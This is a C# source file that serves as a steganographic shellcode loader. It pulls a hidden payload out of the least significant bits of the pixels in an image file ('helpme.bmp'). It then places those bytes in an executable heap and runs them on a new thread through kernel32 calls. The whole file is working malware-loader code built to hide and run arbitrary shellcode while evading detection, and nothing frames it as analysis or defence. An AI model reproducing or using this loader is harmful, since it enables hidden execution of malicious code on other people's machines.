using System;
using System.Drawing;
using System.Threading;
using System.Runtime.InteropServices;

namespace csharp
{
    class Reader
    {
        const int shellcode_len = 1544 + 16;
        static byte[] payload_data = new byte[shellcode_len / 8];

        static void Main(string[] args)
        {
            read_image("helpme.bmp");
            run();
            Thread.Sleep(3000);
        }


        static void read_image(string filename)
        {
            Bitmap bm = new Bitmap(filename);

            int pos = 0;
            for (int i = bm.Height - 1; i >= 0; i--)
            {
                for (int j = 0; j < bm.Width; j++)
                {
                    if (pos < shellcode_len)
                    {
                        Color pixel_color = bm.GetPixel(j, i);
                        payload_data[pos / 8] = get_lsb(payload_data[pos / 8], pixel_color.B);
                        pos++;

                        payload_data[pos / 8] = get_lsb(payload_data[pos / 8], pixel_color.G);
                        pos++;

                        payload_data[pos / 8] = get_lsb(payload_data[pos / 8], pixel_color.R);
                        pos++;
                    }
                    
                }
            }
        }


        static byte get_lsb(byte target, byte source)
        {
            return (byte)((target << 1) | (source & 1));
        }




        static void run() {
            IntPtr heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
            UInt32 ptr = HeapAlloc(heap, 0, shellcode_len / 8);
            Marshal.Copy(payload_data, 0, (IntPtr)ptr, shellcode_len / 8);

            CreateThread(0, 0, ptr, (IntPtr)0, 0, 0);
        }

        



        private static UInt32 HEAP_CREATE_ENABLE_EXECUTE = 0x00040000;


        [DllImport("kernel32")]
        private static extern UInt32 HeapAlloc(
            IntPtr hHeap,
            UInt32 dwFlags,
            UInt32 dwBytes
            );


        [DllImport("kernel32")]
        private static extern IntPtr HeapCreate(
            UInt32 flOptions,
            UInt32 dwInitialSize,
            UInt32 dwMaximumSize
            );


        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(

          UInt32 lpThreadAttributes,
          UInt32 dwStackSize,
          UInt32 lpStartAddress,
          IntPtr param,
          UInt32 dwCreationFlags,
          UInt32 lpThreadId

          );
    }

}
